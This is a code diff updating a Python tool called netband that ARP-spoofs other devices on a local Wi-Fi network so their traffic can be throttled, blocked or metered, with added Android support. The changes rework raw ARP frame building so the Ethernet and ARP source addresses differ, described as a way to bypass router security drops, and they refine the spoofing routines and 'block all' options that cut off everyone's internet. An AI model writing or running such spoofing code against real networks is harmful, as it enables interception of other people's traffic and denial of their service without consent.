@@ -11,6 +11,9 @@ from pathlib import Path
 IS_ANDROID = os.path.exists("/system/build.prop") or "ANDROID_ROOT" in os.environ
 
 try:
+    import logging
+    # Suppress that annoying red Scapy android warning
+    logging.getLogger("scapy.runtime").setLevel(logging.ERROR) 
     from scapy.all import ARP, Ether, sendp, sr1
     import warnings; warnings.filterwarnings("ignore")
     SCAPY_OK = not IS_ANDROID
@@ -18,7 +21,7 @@ except ImportError:
     SCAPY_OK = False
 
 BROADCAST = "ff:ff:ff:ff:ff:ff"
-VERSION = "1.0"
+VERSION = "1.1"
 TOOL_NAME = "netband"
 
 # ── config ───────────────────────────────────────────────────────────
@@ -67,19 +70,24 @@ def sh(cmd):
     return os.popen(cmd).read().strip()
 
 def shq(cmd):
-    os.system(cmd + " 2>/dev/null")
+    os.system(cmd + " >/dev/null 2>&1")
 
 # ── raw ARP (Android-safe) ───────────────────────────────────────────
 
-def _arp_packet(src_mac, src_ip, dst_mac, dst_ip, op=2):
-    """Build raw Ethernet+ARP frame using struct — no Scapy needed."""
-    def mac2b(m):
-        return bytes(int(x, 16) for x in m.split(":"))
-    def ip2b(i):
-        return _socket.inet_aton(i)
-    eth = mac2b(dst_mac) + mac2b(src_mac) + b'\x08\x06'
+def _arp_packet(eth_src, arp_src, arp_src_ip, eth_dst, arp_dst, arp_dst_ip, op=2):
+    """
+    Build raw Ethernet+ARP frame.
+    Separating eth_src and arp_src bypasses WiFi Router security drops!
+    """
+    def mac2b(m): return bytes(int(x, 16) for x in m.split(":"))
+    def ip2b(i): return _socket.inet_aton(i)
+    
+    # Ethernet Header
+    eth = mac2b(eth_dst) + mac2b(eth_src) + b'\x08\x06'
+    # ARP Header
     arp = struct.pack("!HHBBH", 0x0001, 0x0800, 6, 4, op)
-    arp += mac2b(src_mac) + ip2b(src_ip) + mac2b(dst_mac) + ip2b(dst_ip)
+    arp += mac2b(arp_src) + ip2b(arp_src_ip) + mac2b(arp_dst) + ip2b(arp_dst_ip)
+    
     return eth + arp
 
 def _send_raw_arp(iface, pkt):
@@ -89,77 +97,110 @@ def _send_raw_arp(iface, pkt):
         s.send(pkt)
         s.close()
     except Exception:
-        pass  # requires root
+        pass
 
 # ── detection ────────────────────────────────────────────────────────
 
-def _detect_route_proc():
+def _detect_network():
+    iface, gw_ip = None, None
+
     try:
         lines = Path("/proc/net/route").read_text().splitlines()
         for line in lines[1:]:
             parts = line.split()
             if len(parts) >= 3 and parts[1] == "00000000" and parts[2] != "00000000":
                 iface = parts[0]
-                gw_hex = parts[2]
-                b = bytes.fromhex(gw_hex)
-                gw_ip = f"{b[3]}.{b[2]}.{b[1]}.{b[0]}"
+                gw_ip = _socket.inet_ntoa(struct.pack("<L", int(parts[2], 16)))
                 return iface, gw_ip
-    except Exception:
-        pass
-    return None, None
+    except Exception: pass
+
+    out = sh("ip route show table all 2>/dev/null")
+    for line in out.splitlines():
+        m = re.search(r"default\s+via\s+([0-9\.]+)\s+dev\s+(\S+)", line)
+        if m: return m.group(2), m.group(1)
+
+    out = sh("ip route 2>/dev/null")
+    for line in out.splitlines():
+        m = re.search(r"default\s+via\s+([0-9\.]+)\s+dev\s+(\S+)", line)
+        if m: return m.group(2), m.group(1)
+
+    if IS_ANDROID:
+        out = sh("dumpsys connectivity 2>/dev/null")
+        m = re.search(r"0\.0\.0\.0/0\s*->\s*([0-9\.]+)\s+(\S+)", out)
+        if m: return m.group(2), m.group(1)
+        
+        out = sh("dumpsys wifi 2>/dev/null")
+        m_gw = re.search(r"(?i)gateway[:=]\s*([0-9\.]+)", out)
+        if m_gw: gw_ip = m_gw.group(1)
+        
+        iface = sh("getprop wifi.interface 2>/dev/null").strip() or iface
+
+    return iface, gw_ip
 
 def detect_iface():
-    iface, _ = _detect_route_proc()
-    if iface: return iface
-    m = re.search(r"dev\s+(\S+)", sh("ip route show default"))
+    i, _ = _detect_network()
+    return i
+
+def get_local_ip(iface):
+    try:
+        s = _socket.socket(_socket.AF_INET, _socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80)) 
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except Exception:
+        pass
+    m = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)", sh(f"ip -4 addr show dev {iface} 2>/dev/null"))
     return m.group(1) if m else None
 
-def detect_gw():
-    _, gw = _detect_route_proc()
-    if gw: return gw
-    m = re.search(r"via\s+(\S+)", sh("ip route show default"))
-    return m.group(1) if m else None
+def detect_gw(iface=None):
+    _, g = _detect_network()
+    if g: return g
+    
+    if iface:
+        loc = get_local_ip(iface)
+        if loc:
+            net = ".".join(loc.split(".")[:3])
+            for last in ["1", "254", "0"]: 
+                test_gw = f"{net}.{last}"
+                if test_gw != loc and os.system(f"ping -c 1 -W 1 {test_gw} >/dev/null 2>&1") == 0:
+                    return test_gw
+            return f"{net}.1"
+    return None
 
 def get_mac(ip, iface=None):
-    # Trigger routing cache/ARP lookup natively by sending a UDP dummy payload
     try:
         s = _socket.socket(_socket.AF_INET, _socket.SOCK_DGRAM)
         s.sendto(b"", (ip, 1))
         s.close()
-    except Exception:
-        pass
-    # 1. ip neigh (fast, no root needed)
-    out = sh(f"ip neigh show {ip}")
+    except Exception: pass
+    
+    try:
+        for line in open("/proc/net/arp").read().splitlines()[1:]:
+            parts = line.split()
+            if len(parts) >= 4 and parts[0] == ip:
+                mac = parts[3].lower()
+                if mac != "00:00:00:00:00:00": return mac
+    except Exception: pass
+    
+    out = sh(f"ip neigh show {ip} 2>/dev/null")
     m = re.search(r"lladdr\s+([0-9a-fA-F:]{17})", out)
     if m: return m.group(1).lower()
-    # 2. arping fallback (works on Android with root)
+    
     iface_flag = f"-I {iface}" if iface else ""
-    out2 = sh(f"{ARPING} -c 2 -f {iface_flag} {ip} 2>/dev/null")
+    out2 = sh(f"{ARPING} -c 2 -w 2 -f {iface_flag} {ip} 2>/dev/null")
     m2 = re.search(r"\[([0-9a-fA-F:]{17})\]", out2)
     if m2: return m2.group(1).lower()
-    # 3. Scapy — desktop Linux only
+    
     if SCAPY_OK:
-        r = sr1(ARP(op=1, pdst=ip), timeout=3, verbose=0)
-        return r.hwsrc.lower() if r else None
+        try:
+            r = sr1(ARP(op=1, pdst=ip), timeout=1, verbose=0)
+            if r: return r.hwsrc.lower()
+        except: pass
     return None
 
-def get_local_ip(iface):
-    # Try local interface IP via socket connect (native, no subprocess)
-    try:
-        gw_ip = detect_gw()
-        if gw_ip:
-            s = _socket.socket(_socket.AF_INET, _socket.SOCK_DGRAM)
-            s.connect((gw_ip, 80))
-            ip = s.getsockname()[0]
-            s.close()
-            return ip
-    except Exception:
-        pass
-    m = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)", sh(f"ip -4 addr show dev {iface}"))
-    return m.group(1) if m else None
-
 def get_subnet(iface):
-    m = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)/(\d+)", sh(f"ip -4 addr show dev {iface}"))
+    m = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)/(\d+)", sh(f"ip -4 addr show dev {iface} 2>/dev/null"))
     if not m: return None, None
     return m.group(1), int(m.group(2))
 
@@ -242,19 +283,13 @@ class Spoofer:
 
     def _send_spoof(self, ip, mac):
         if SCAPY_OK:
-            sendp(Ether(dst=self.gw_mac)/ARP(op=2, psrc=ip, pdst=self.gw_ip,
-                  hwdst=self.gw_mac, hwsrc=self.local_mac),
-                  verbose=0, iface=self.iface)
-            sendp(Ether(dst=mac)/ARP(op=2, psrc=self.gw_ip, pdst=ip,
-                  hwdst=mac, hwsrc=self.local_mac),
-                  verbose=0, iface=self.iface)
+            sendp(Ether(dst=self.gw_mac)/ARP(op=2, psrc=ip, pdst=self.gw_ip, hwdst=self.gw_mac, hwsrc=self.local_mac), verbose=0, iface=self.iface)
+            sendp(Ether(dst=mac)/ARP(op=2, psrc=self.gw_ip, pdst=ip, hwdst=mac, hwsrc=self.local_mac), verbose=0, iface=self.iface)
         else:
-            # tell gateway: ip is at our mac
-            _send_raw_arp(self.iface,
-                _arp_packet(self.local_mac, ip, self.gw_mac, self.gw_ip))
-            # tell target: gateway is at our mac
-            _send_raw_arp(self.iface,
-                _arp_packet(self.local_mac, self.gw_ip, mac, ip))
+            # Tell Target: GW is at MY_MAC
+            _send_raw_arp(self.iface, _arp_packet(self.local_mac, self.local_mac, self.gw_ip, mac, mac, ip, op=2))
+            # Tell GW: Target is at MY_MAC
+            _send_raw_arp(self.iface, _arp_packet(self.local_mac, self.local_mac, ip, self.gw_mac, self.gw_mac, self.gw_ip, op=2))
 
     def add(self, ip, mac):
         with self._lock:
@@ -271,24 +306,32 @@ class Spoofer:
 
     def _stop(self):
         self._running = False
-        shq(f"{SYSCTL} -w {IP_FWD}={self._fwd_orig or '0'}")
-        shq("conntrack -F 2>/dev/null")
+        
+        # Delay dimatikan setelah 2 detik agar routing jalan sejenak selama HP update cache
+        def delayed_stop():
+            time.sleep(2) 
+            with self._lock:
+                if not self._targets:
+                    shq(f"{SYSCTL} -w {IP_FWD}={self._fwd_orig or '0'}")
+                    shq("conntrack -F 2>/dev/null")
+                    
+        threading.Thread(target=delayed_stop, daemon=True).start()
 
     def _restore(self, ip, mac):
-        for _ in range(5):
+        # Kirim beberapa kali untuk memastikan paket sampai
+        for _ in range(4):
             if SCAPY_OK:
-                sendp(Ether(dst=self.gw_mac)/ARP(op=2, psrc=ip, hwsrc=mac,
-                      pdst=self.gw_ip, hwdst=BROADCAST),
-                      verbose=0, iface=self.iface)
-                sendp(Ether(dst=mac)/ARP(op=2, psrc=self.gw_ip, hwsrc=self.gw_mac,
-                      pdst=ip, hwdst=BROADCAST),
-                      verbose=0, iface=self.iface)
+                sendp(Ether(dst=self.gw_mac)/ARP(op=2, psrc=ip, hwsrc=mac, pdst=self.gw_ip, hwdst=BROADCAST), verbose=0, iface=self.iface)
+                sendp(Ether(dst=mac)/ARP(op=2, psrc=self.gw_ip, hwsrc=self.gw_mac, pdst=ip, hwdst=BROADCAST), verbose=0, iface=self.iface)
             else:
-                # restore real MACs to both parties
-                _send_raw_arp(self.iface,
-                    _arp_packet(mac, ip, BROADCAST, self.gw_ip))
-                _send_raw_arp(self.iface,
-                    _arp_packet(self.gw_mac, self.gw_ip, BROADCAST, ip))
+                # 1. Unicast Ethernet -> Broadcast ARP Payload (Paling masuk akal & tembus AP Filter)
+                _send_raw_arp(self.iface, _arp_packet(self.local_mac, self.gw_mac, self.gw_ip, mac, BROADCAST, ip, op=2))
+                _send_raw_arp(self.iface, _arp_packet(self.local_mac, mac, ip, self.gw_mac, BROADCAST, self.gw_ip, op=2))
+                
+                # 2. Broadcast murni jaga-jaga
+                _send_raw_arp(self.iface, _arp_packet(self.local_mac, self.gw_mac, self.gw_ip, BROADCAST, BROADCAST, ip, op=2))
+                _send_raw_arp(self.iface, _arp_packet(self.local_mac, mac, ip, BROADCAST, BROADCAST, self.gw_ip, op=2))
+            
             time.sleep(0.1)
 
     def restore_all(self):
@@ -432,35 +475,27 @@ def scan(iface, gw_ip, custom=None, limiter=None, spoofer=None, gw_mac=None):
         ips = [f"{net}.{i}" for i in range(1, 255)]
 
     print(f"{C.DIM}Scanning ...{C.RST}")
-    # clear ARP cache for this interface
     sh(f"ip neigh flush dev {iface} nud failed nud incomplete 2>/dev/null")
 
     local_mac = spoofer.local_mac if spoofer else get_mac(get_local_ip(iface), iface)
     local_ip = spoofer.local_ip if spoofer else get_local_ip(iface)
 
-    # ponytail: raw ARP scan relies on raw socket capability and system euid=0;
-    # it bypasses external command spawning completely, eliminating mobile device hangs.
-    # Upgrade path: Support IPv6 NDP solicitation sweep if IPv6 target scanning is requested.
     if local_mac and local_ip:
         for ip in ips:
-            # op=1 is ARP request, dst_mac is BROADCAST
-            pkt = _arp_packet(local_mac, local_ip, BROADCAST, ip, op=1)
+            pkt = _arp_packet(local_mac, local_mac, local_ip, BROADCAST, BROADCAST, ip, op=1)
             _send_raw_arp(iface, pkt)
             time.sleep(0.002)
         time.sleep(1.0)
     else:
-        # Fallback to chunked ping sweep (max 32 concurrent processes to prevent Android resource exhaustion)
         chunks = [ips[i:i + 32] for i in range(0, len(ips), 32)]
         for chunk in chunks:
             ip_list = " ".join(chunk)
-            sh(f"for i in {ip_list}; do ping -c1 -W1 $i &>/dev/null & done; wait")
+            sh(f"for i in {ip_list}; do ping -c1 -W1 $i >/dev/null 2>&1 & done; wait")
         time.sleep(0.5)
 
     devices = load(DEVICES_FILE)
     active_devices = {}
 
-    # Pre-populate active_devices with hosts that are currently limited or blocked
-    # so we don't discard them even if they are offline right now.
     for mac, d in devices.items():
         if limiter and limiter.is_limited(d["ip"]):
             d["online"] = False
@@ -468,13 +503,11 @@ def scan(iface, gw_ip, custom=None, limiter=None, spoofer=None, gw_mac=None):
 
     seen = set()
 
-    # collect currently reachable MACs (only REACHABLE/DELAY/PROBE, not STALE)
     for line in sh(f"ip neigh show dev {iface}").splitlines():
         p = line.split()
         if len(p) < 4: continue
         ip, ll, mac, state = p[0], p[1], p[2], p[3]
         if ll != "lladdr": continue
-        # only trust confirmed connections
         if state not in ("REACHABLE", "DELAY", "PROBE"): continue
         if mac == "00:00:00:00:00:00" or ":" not in mac: continue
         mac = mac.lower()
@@ -494,7 +527,6 @@ def scan(iface, gw_ip, custom=None, limiter=None, spoofer=None, gw_mac=None):
             except: pass
             active_devices[mac] = {"id": -1, "ip": ip, "mac": mac, "hostname": hn, "limits": {}, "online": True}
 
-    # Ensure Gateway is in active_devices
     if gw_mac:
         gw_mac_lower = gw_mac.lower()
         if gw_mac_lower not in active_devices:
@@ -504,48 +536,35 @@ def scan(iface, gw_ip, custom=None, limiter=None, spoofer=None, gw_mac=None):
                 active_devices[gw_mac_lower]["online"] = True
             else:
                 active_devices[gw_mac_lower] = {
-                    "id": 0,
-                    "ip": gw_ip,
-                    "mac": gw_mac_lower,
-                    "hostname": "gateway",
-                    "limits": {},
-                    "online": True
+                    "id": 0, "ip": gw_ip, "mac": gw_mac_lower,
+                    "hostname": "gateway", "limits": {}, "online": True
                 }
 
-    # Re-index all active devices: Gateway gets ID 0, others sorted by IP numerically
     gw_device = None
     if gw_mac:
         gw_device = active_devices.pop(gw_mac.lower(), None)
     else:
-        # search by IP if gw_mac is not supplied
         for mac, d in list(active_devices.items()):
             if d["ip"] == gw_ip:
                 gw_device = active_devices.pop(mac)
                 break
 
     def ip_key(item):
-        try:
-            return list(map(int, item[1]["ip"].split(".")))
-        except:
-            return [999, 999, 999, 999]
+        try: return list(map(int, item[1]["ip"].split(".")))
+        except: return [999, 999, 999, 999]
 
     sorted_non_gw = sorted(active_devices.items(), key=ip_key)
 
     rebuilt_devices = {}
     if gw_device:
         gw_device["id"] = 0
-        # For the gateway, keep hostname as gateway or its resolved hostname
         if not gw_device["hostname"] or gw_device["hostname"] == gw_ip:
             gw_device["hostname"] = "gateway"
         rebuilt_devices[gw_device["mac"]] = gw_device
     elif gw_mac:
         rebuilt_devices[gw_mac.lower()] = {
-            "id": 0,
-            "ip": gw_ip,
-            "mac": gw_mac.lower(),
-            "hostname": "gateway",
-            "limits": {},
-            "online": True
+            "id": 0, "ip": gw_ip, "mac": gw_mac.lower(),
+            "hostname": "gateway", "limits": {}, "online": True
         }
 
     for idx, (mac, d) in enumerate(sorted_non_gw, start=1):
@@ -559,7 +578,7 @@ def scan(iface, gw_ip, custom=None, limiter=None, spoofer=None, gw_mac=None):
 
 def watch_check(iface, watchlist, devices, gw_ip):
     net = ".".join(gw_ip.split(".")[:3])
-    sh(f"for i in $(seq 1 254); do ping -c1 -W0.2 {net}.$i &>/dev/null & done; wait")
+    sh(f"for i in $(seq 1 254); do ping -c1 -W0.2 {net}.$i >/dev/null 2>&1 & done; wait")
     changes = []
     for mac in list(watchlist.get("hosts", [])):
         if mac not in devices: continue
@@ -587,7 +606,7 @@ def get_traffic():
     return d
 
 def get_tc_stats(iface):
-    out = sh(f"{TC} -s class show dev {iface}")
+    out = sh(f"{TC} -s class show dev {iface} 2>/dev/null")
     r = {}
     for m in re.finditer(r"class htb 1:(\d+).*?Sent\s+(\d+)\s+bytes.*?rate\s+(\S+)", out, re.DOTALL):
         r[int(m.group(1))] = {"bytes": int(m.group(2)), "rate": m.group(3)}
@@ -704,9 +723,19 @@ def main():
 
     if args.colorless: no_color()
 
-    iface = args.i or detect_iface()
-    gw_ip = args.g or detect_gw()
-    gw_mac = args.m or (get_mac(gw_ip, iface) if gw_ip else None)
+    iface = args.i
+    gw_ip = args.g
+    if not iface or not gw_ip:
+        det_iface, det_gw = _detect_network()
+        if not iface: iface = det_iface or detect_iface()
+        if not gw_ip: gw_ip = det_gw or detect_gw(iface)
+
+    gw_mac = args.m
+    if not gw_mac and gw_ip:
+        gw_mac = get_mac(gw_ip, iface)
+        if not gw_mac:
+            shq(f"ping -c 1 -W 1 {gw_ip}")
+            gw_mac = get_mac(gw_ip, iface)
 
     if not iface: print(f"{C.RED}No interface. Use -i.{C.RST}"); sys.exit(1)
     if not gw_ip: print(f"{C.RED}No gateway. Use -g.{C.RST}"); sys.exit(1)
@@ -790,7 +819,9 @@ def main():
             if not devs:
                 print(f"{C.RED}No matching hosts.{C.RST}"); continue
             for d in devs:
-                if d["ip"] == gw_ip: continue
+                if d["ip"] == gw_ip:
+                    print(f"{C.YEL}Skipping Gateway. Use 'limit all' to limit the whole network.{C.RST}")
+                    continue
                 spoofer.add(d["ip"], d["mac"])
                 limiter.limit(d["ip"], rate, direction)
                 d["limits"] = {"rate": rate, "direction": direction}
@@ -807,7 +838,9 @@ def main():
             if not devs:
                 print(f"{C.RED}No matching hosts.{C.RST}"); continue
             for d in devs:
-                if d["ip"] == gw_ip: continue
+                if d["ip"] == gw_ip:
+                    print(f"{C.YEL}Skipping Gateway. Use 'block all' to drop everyone's internet.{C.RST}")
+                    continue
                 spoofer.add(d["ip"], d["mac"])
                 limiter.block(d["ip"], direction)
                 d["limits"] = {"rate": None, "direction": direction, "blocked": True}
@@ -821,6 +854,7 @@ def main():
             if not devs:
                 print(f"{C.RED}No matching hosts.{C.RST}"); continue
             for d in devs:
+                if d["ip"] == gw_ip: continue
                 limiter.unlimit(d["ip"])
                 spoofer.remove(d["ip"])
                 d["limits"] = {}
@@ -891,29 +925,24 @@ def main():
                 print(f"{C.RED}No matching hosts.{C.RST}"); continue
             
             print(f"{C.BLD}Initializing passive analysis for {len(devs)} host(s)...{C.RST}")
-            # Set up iptables accounting chain
+            
+            shq(f"{IPT} -D FORWARD -j NETBAND_ACCT")
+            shq(f"{IPT} -F NETBAND_ACCT")
+            shq(f"{IPT} -X NETBAND_ACCT")
             shq(f"{IPT} -N NETBAND_ACCT")
             shq(f"{IPT} -I FORWARD -j NETBAND_ACCT")
             
-            # Start ARP spoofing and insert accounting rules
             spoofed_ips = []
             for d in devs:
                 if d["ip"] == gw_ip: continue
-                # Only spoof if not already spoofing (i.e. not limited/blocked)
                 if not limiter.is_limited(d["ip"]):
                     spoofer.add(d["ip"], d["mac"])
                     spoofed_ips.append(d["ip"])
-                # Add accounting rules (no target means pure byte/packet accounting)
                 shq(f"{IPT} -A NETBAND_ACCT -s {d['ip']}")
                 shq(f"{IPT} -A NETBAND_ACCT -d {d['ip']}")
 
             print(f"{C.BLD}Analyzing (Ctrl+C to stop)...{C.RST}")
             
-            # ponytail: passive analysis relies on iptables accounting which only tracks IPv4 routed traffic;
-            # IPv6 or local subnet-to-subnet traffic not routed through our interface is not counted.
-            # Upgrade path: Use scapy sniff or raw sockets to capture and parse all packet headers.
-            
-            # Helper to parse bytes from iptables
             def read_bytes():
                 data = {}
                 out = sh(f"{IPT} -L NETBAND_ACCT -n -v -x")
@@ -925,11 +954,9 @@ def main():
                             src = parts[6]
                             dst = parts[7]
                             if dst == "0.0.0.0/0":
-                                # This is from source IP (TX from host)
                                 if src not in data: data[src] = {"tx": 0, "rx": 0}
                                 data[src]["tx"] = bytes_cnt
                             elif src == "0.0.0.0/0":
-                                # This is to destination IP (RX to host)
                                 if dst not in data: data[dst] = {"tx": 0, "rx": 0}
                                 data[dst]["rx"] = bytes_cnt
                         except ValueError:
@@ -976,11 +1003,9 @@ def main():
             except KeyboardInterrupt:
                 pass
             finally:
-                # Cleanup accounting iptables rules
                 shq(f"{IPT} -D FORWARD -j NETBAND_ACCT")
                 shq(f"{IPT} -F NETBAND_ACCT")
                 shq(f"{IPT} -X NETBAND_ACCT")
-                # Remove from spoofer if they were not limited/blocked
                 for ip in spoofed_ips:
                     spoofer.remove(ip)
             print(f"\n{C.DIM}Done.{C.RST}")
